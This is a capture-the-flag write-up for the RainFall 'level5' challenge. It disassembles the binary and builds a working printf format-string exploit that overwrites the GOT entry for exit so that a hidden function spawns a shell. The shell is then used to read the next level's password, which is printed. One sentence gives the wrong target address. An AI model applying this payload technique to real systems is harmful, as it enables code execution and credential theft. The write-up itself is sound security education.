# level5

> We use [GDB peda](https://github.com/longld/peda) in order to get a better GDB visualization.

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

Once again, `main` calls a function `n` which declares a buffer, use `fgets` to feed it, then print it with `printf`.

```gdb
gdb-peda$ disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   ebp
   0x080484c3 <+1>:     mov    ebp,esp
   0x080484c5 <+3>:     sub    esp,0x218
   0x080484cb <+9>:     mov    eax,ds:0x8049848
   0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:    lea    eax,[ebp-0x208]
   0x080484e2 <+32>:    mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    eax,[ebp-0x208]
   0x080484f0 <+46>:    mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
```

Thanks to `objdump`, we find out another interesting function which is not called, `o`.

```gdb
gdb-peda$ disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x18
   0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0   ; push address 0x80485f0 to stack (contains "/bin/sh")
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```

We easily understand that we must find a way to call the function `o` that will spawn a shell thanks to `system`.

We notice `<exit@plt>` in `n` and `<_exit@plt>` in `o`. It puts the chip in our ear: we could use the _GOT_ (Global Offset Table). When the program runs for the first time

```console
level5@RainFall:~$ objdump -TR level5

level5:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000      DF *UND*   00000000  GLIBC_2.0   printf
00000000      DF *UND*   00000000  GLIBC_2.0   _exit
00000000      DF *UND*   00000000  GLIBC_2.0   fgets
00000000      DF *UND*   00000000  GLIBC_2.0   system
00000000  w   D  *UND*   00000000              __gmon_start__
00000000      DF *UND*   00000000  GLIBC_2.0   exit
00000000      DF *UND*   00000000  GLIBC_2.0   __libc_start_main
080485ec g    DO .rodata 00000004  Base    _IO_stdin_used
08049848 g    DO .bss    00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

The above list of dynamic relocation entries shows us the adresses where the program will jump when one of theses functions (included from shared libraries) are called.

So, using the same `printf` vulnerability as in the previous level, we will overwrite the address pointed by `exit` from the GOT with the address of the function `o` (0x080484a4).

## Exploit

Once again, the field width modifier of `printf` will help us to write the value we want. But this value is so high (0x080484a4 => 134 513 828 in decimal) that trying to use it as such for the padding leads us to a long waiting (for the printf writing) and no result.

Looking for a way to write large values with the `printf` format string vulnerability, we find that we can split the writing process by using the type conversion specifiers. For our case, halving the number of bytes that we write will do the trick.

Knowing that we want to write the value 080484a4 to the address 0x080484a4, we will proceed as follow :
- Split the value in two parts for the padding (0804 and 84a4 => 2052 and 33956 in decimal).
- Start the string with the target address + 2, then the target address itself. (the reverse order is due to the endianness).
- Use both type conversion specifier and argument reference to write two bytes twice.

We first dump the stack with some `%x` to spot which argument (the 4th here) corresponds to the beginning of our string on the stack (see previous level). Let's describe how we format the final string :
- First, put the two target adresses : "\x3a\x98\x04\x08\x38\x98\x04\x08"
- Then, we set the padding to write the value 2052 (0804). Do not forget to subtract 8 (from the addresses printed before) : "%2044x"
- Write a short integer (2-byte long) to the first address we have provided : "%4$hn"
- Set the padding to reach the second value to write (33956). Subtract the number of bytes written so far (2052) : "%31904x"
- Finally, write the second part of the value to the two bytes corresponding to the target address : "%5$hn"

Everything is set now, let's do it !

```console
level5@RainFall:~$ python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"' > /tmp/level5
level5@RainFall:~$ cat /tmp/level5 - | ./level5
...
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```